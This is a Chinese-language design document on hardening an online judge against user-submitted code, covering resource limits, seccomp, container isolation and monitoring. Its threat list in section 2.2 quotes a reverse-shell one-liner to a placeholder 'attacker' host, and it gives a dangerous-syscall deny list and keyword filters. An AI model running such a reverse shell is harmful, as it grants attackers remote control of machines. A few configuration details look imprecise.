## 一、背景与整体架构

### 1.1 典型判题流程

```
用户提交代码
    │
    ▼
┌─────────────────┐
│   代码接收层      │  → 验证用户登录态、题目 ID、参数合法性
└────────┬────────┘
         ▼
┌─────────────────┐
│   编译阶段        │  → 将源代码编译为可执行文件
└────────┬────────┘
         ▼
┌─────────────────┐
│   执行阶段        │  → 以受限权限运行可执行文件，喂入测试用例
└────────┬────────┘
         ▼
┌─────────────────┐
│   结果比对        │  → 比对输出与期望输出，生成判题结果
└─────────────────┘
```

## 二、已知安全隐患与防护方案

### 2.1 题目逻辑错误导致死循环——资源耗尽

**风险描述**

- 题目数据中若存在环或极端边界条件，用户提交的代码可能陷入死循环
- 死循环会持续占用 CPU 和内存，导致同批次其他判题任务被阻塞

**防护方案**

| 层级 | 措施 | 说明 |
|------|------|------|
| 时间限制 | 每个测试用例强制 `CPU Time Limit`（通常 1~10s） | 超出后由系统发送 SIGXCPU 信号终止进程 |
| 内存限制 | `Memory Limit`（通常 256MB~1GB） | 超出后 OOM Kill 或返回 MLE |
| 栈大小限制 | `-Wl,--stack=<bytes>`（C++） | 防止无限递归撑爆栈 |
| 进程数限制 | `ulimit -u` 或 cgroup pid_max | 防止 fork 炸弹 |
| 运行时监控 | 双重计时（用户态 + 内核态） | 防止时间绕过 |
| 隔离队列 | 每个判题任务独立容器 / cgroup | 单题崩溃不影响全局 |

```bash
# Linux cgroup 示例
cgcreate -g cpu,memory:/judge_slice
echo 2000000 > /sys/fs/cgroup/cpu/judge_slice/cpu.cfs_quota_us   # 2s CPU
echo 268435456 > /sys/fs/cgroup/memory/judge_slice/memory.limit_in_bytes  # 256MB
cgexec -g cpu,memory:/judge_slice ./user_program
```

**判题超时状态码对照**

| 结果 | 枚举值 | 说明 |
|------|--------|------|
| TIME_LIMIT_EXCEEDED | 4 | CPU 超时 |
| MEMORY_LIMIT_EXCEEDED | 5 | 内存超限 |

### 2.2 代码本身包含病毒或恶意逻辑——系统渗透

**风险描述**

用户可能提交包含以下恶意行为的代码：

- **反弹 shell**：`bash -i >& /dev/tcp/attacker/port 0>&1`
- **本地提权**：利用 SUID 程序或系统漏洞
- **文件窃取**：读取 `/etc/passwd`、用户目录等敏感文件
- **横向移动**：扫描内网、探测其他服务端口
- **挖矿程序**：占用 CPU 进行加密货币运算

**防护方案**

| 层级 | 措施 | 说明 |
|------|------|------|
| 进程权限 | 以非 root（如 `nobody` / `judge`）运行 | 最小化系统权限 |
| Linux Capability | 丢弃所有 Capability（`CAP_ALL=drop`） | 防止特权操作 |
| seccomp | 白名单系统调用，仅允许 read/write/exit 等 | 禁止 execve / socket / mount 等 |
| 文件系统隔离 | chroot 或容器挂载空白 `/` | 用户进程无法访问宿主机文件 |
| 网络隔离 | `--network=none` | 禁止一切网络通信 |
| 敏感路径挂载只读 | `/etc/passwd`、`/etc/shadow` 等只读绑定 | 防止修改 |
| 禁止动态链接 / 内联汇编 | C++ 禁止 `-z execstack` | 防止代码注入 |
| 提交内容预扫描 | 正则检测敏感关键字（如 `socket`、`fork`、`exec`） | 在编译前拦截明显恶意代码 |

```json
// Judge0 seccomp 配置文件（stub_64.json 典型白名单）
{
  "whitelist": [
    "read", "write", "_exit", "exit_group",
    "brk", "mmap", "mprotect"
  ]
}
```

**危险系统调用黑名单**

| 系统调用 | 风险 | 建议 |
|----------|------|------|
| `execve` / `execveat` | 执行任意程序 | 禁止 |
| `socket` / `connect` | 建立网络连接 | 禁止 |
| `fork` / `vfork` / `clone` | 进程复制（fork 炸弹） | 限制或禁止 |
| `mount` / `chroot` | 文件系统劫持 | 禁止 |
| `ptrace` | 进程调试 / 注入 | 禁止 |
| `kill` / `syslog` | 向其他进程发信号 | 禁止 |
| `reboot` | 系统重启 | 禁止 |

### 2.3 高权限代码执行——数据泄露

**风险描述**

- 判题系统若以 root 或高权限运行，用户代码一旦突破沙箱，可读写任意系统文件
- 可能导致：数据库连接字符串泄露、其他用户提交代码被窃取、SSH 密钥外泄
- 特别危险：判题机与主服务处于同一内网，突破后可直接横移

**防护方案**

| 层级 | 措施 | 说明 |
|------|------|------|
| 独立网络区域 | 判题集群与内网主服务网络隔离 | 零信任原则 |
| 最小权限运行 | 用户代码始终以低权限系统用户运行 | uid/gid >= 1000 |
| Capability 精细控制 | 仅保留运行时必需的 Capability | 避免权限扩散 |
| 审计日志 | 记录所有判题请求、执行时长、退出码 | 事后溯源 |
| 密钥隔离 | 数据库密码、OSS Token 等不进判题环境 | 通过环境变量白名单注入 |
| 定期漏洞扫描 | 内网扫描判题集群可接触的资产 | 降低横移风险 |

```bash
# 使用 unshare + chroot 创建隔离环境
unshare --pid --net --mount --ipc --uts --user --map-root-user \
  chroot /empty_jail /sandboxed_program
```

### 2.4 多代码同时执行——相互干扰

**风险描述**

| 干扰类型 | 具体场景 |
|----------|----------|
| 共享资源竞争 | 多用户同时写同一临时文件 /dev/shm |
| 端口冲突 | 用户代码意外绑定端口，与其他判题任务冲突 |
| 文件描述符泄露 | 未关闭的 fd 消耗宿主机 fd 配额 |
| 共享内存污染 | /tmp 或 /var/tmp 被多个任务同时使用 |
| 内核状态污染 | 多容器同时写 /proc/sys 等共享内核参数 |
| 时间推断攻击 | 通过侧信道（执行时间差异）推断其他用户数据 |

**防护方案**

| 层级 | 措施 | 说明 |
|------|------|------|
| 容器/进程隔离 | 每个判题任务独立 cgroup + 挂载命名空间 | 资源硬隔离 |
| 临时文件系统 | tmpfs 只读或限制大小（如 64MB） | 防止文件写入失控 |
| 文件描述符限制 | `ulimit -n 1024` | 防止 fd 耗尽 |
| PID 限制 | cgroup pid_max 或 ulimit -u | 防止 fork 炸弹 |
| 独立工作目录 | 每个任务在独立子目录中执行，结束后彻底清空 | 防止数据残留 |
| 端口白名单 | 判题进程禁止 bind/listen | 意外绑定端口直接拒绝 |
| 禁用共享内存 | `--shm-size=0`（Docker）或移除 /dev/shm 挂载 | 防止 shm 竞争 |
| 随机化处理 | 任务调度加入随机延迟，防止时间侧信道 | 抵御 TOCTOU 类攻击 |

```yaml
# Docker 判题容器安全配置示例
security_opt:
  - no-new-privileges:true
  - seccomp:default
cap_drop:
  - ALL
read_only: true
tmpfs:
  - /tmp:size=64m,noexec,nosuid,nodev
  - /run:size=8m,noexec,nosuid,nodev
```

## 五、开发建议

### 5.1 新增语言支持 Checklist

每次新增语言（如 Go、Rust、JavaScript）时，必须检查：

- [ ] 该语言运行时是否支持禁用网络（如 Node.js `--inspect` 禁用）
- [ ] 编译/解释器是否需要特殊权限（如 FFI / JNI）
- [ ] 是否存在固有系统调用（Go 的 `runtime·sched` 可能用到 clone）
- [ ] 语言版本是否与 seccomp 白名单兼容
- [ ] 是否需要在文件系统禁止写入后仍能正常执行

### 5.2 日常巡检指标

| 监控项 | 阈值 | 告警动作 |
|--------|------|----------|
| 单题判题时长 > 30s | 触发 | 立即kill + 人工审查题目数据 |
| 内存使用 > 80% limit | 持续 5min | 扩容或限制并发数 |
| 进程数异常增长 | 超过 cgroup 限额 | 强制终止 + 记录日志 |
| 同一用户高频提交 | > 10次/分钟 | 限流或触发人机验证 |
| 编译失败率异常 | > 30% | 检查编译器环境或恶意提交 |
